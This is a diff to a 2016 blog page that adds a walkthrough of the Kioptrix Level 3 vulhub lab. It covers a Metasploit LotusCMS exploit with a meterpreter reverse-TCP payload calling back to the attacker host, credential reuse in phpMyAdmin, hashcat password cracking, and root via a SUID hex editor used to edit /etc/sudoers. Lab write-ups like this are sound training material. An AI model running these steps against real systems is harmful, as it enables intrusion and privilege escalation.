@@ -5,14 +5,16 @@
 	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
 	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
 	<meta charset="utf-8">
-	<title>vulhub-Kiotrix Level 3  | Bob1Bob2</title>
+	<title>vulhub-Kioptrix Level 3  | Bob1Bob2</title>
 
 <meta name="author" content="Bob1Bob2"> 
 
 <meta name="description" content="Tools: netdiscover
 Nmap
-zap
-netcat Use netdiscover to detect target IP address netdiscover -i eth0 -r 192.168.79.0/24 192.168.79.184 is the target. &hellip;"> <meta name="keywords" content="">
+Nikto
+Metasploit
+Wfuzz
+Hashcat Use netdiscover to detect target IP address netdiscover -i eth0 -r 192.168.79.0/24 192.168.79. &hellip;"> <meta name="keywords" content="">
 
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -100,14 +102,16 @@ $(document).ready(
 </header>
 
 	<div id="content" class="inner"><article class="post">
-	<h2 class="title">vulhub-Kiotrix Level 3</h2>
+	<h2 class="title">vulhub-Kioptrix Level 3</h2>
 	<div class="entry-content"><h3>Tools:</h3>
 
 <ul>
 <li>netdiscover</li>
 <li>Nmap</li>
-<li>zap</li>
-<li>netcat</li>
+<li>Nikto</li>
+<li>Metasploit</li>
+<li>Wfuzz</li>
+<li>Hashcat</li>
 </ul>
 
 
@@ -128,7 +132,103 @@ $(document).ready(
 
 <p><img src="/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>Ports 22 and 80 are opening</p>
+<p>Ports 22 and 80 are opening.</p>
+
+<p>Now use Nikto to scan:</p>
+
+<p><code>nikto -h 192.168.79.184</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Nothing excited.</p>
+
+<p>Now lets browser the web page in the target.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find the target may use LotusCMS.</p>
+
+<p>In msfconsole:</p>
+
+<p><code>search LotusCMS</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find one exploit</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/lcms_php_exec 
+</span><span class='line'>msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
+</span><span class='line'>msf exploit(lcms_php_exec) &gt; set uri 
+</span><span class='line'>msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
+</span><span class='line'>msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
+</span><span class='line'>exploit</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Got the shell, next step is try to get root.</p>
+
+<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>maybe the  username/password for ssh, but no. Thats too easy.</p>
+
+<p>So that I go back to use wfuzz the scan the http services.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like it has phpmyadmin. Try that:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Log in using the username/password that just found. Successed.</p>
+
+<p>review the content, found this:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now found two users and the hashed passwords:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Copy the passwords to a file use hashcat to crack it:</p>
+
+<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>
+
+<p>get both passwords:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>ssh to the target, search the SUID binaries:</p>
+
+<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>
+
+<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>
+
+<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>
+
+<p><code>export TERM=xterm</code></p>
+
+<p>change the loneferret permission:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the root</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
 </div>
 
 
@@ -148,6 +248,12 @@ $(document).ready(
 <time datetime="2016-06-09T11:42:38-05:00" pubdate data-updated="true">2016-06-09 11:42:38 -0500</time></div>
 	
 
+<div class="tags">
+
+	<a class='category' href='/blog/categories/kioptrix/'>kioptrix</a>, <a class='category' href='/blog/categories/suid/'>suid</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
 
 	
 </div></article>
@@ -166,7 +272,7 @@ $(document).ready(
 
 
 </div>
-	<footer id="footer" class="inner">Copyright &copy; 2016
+	<footer id="footer" class="inner">Copyright &copy; 2017
 
     Bob1Bob2
 
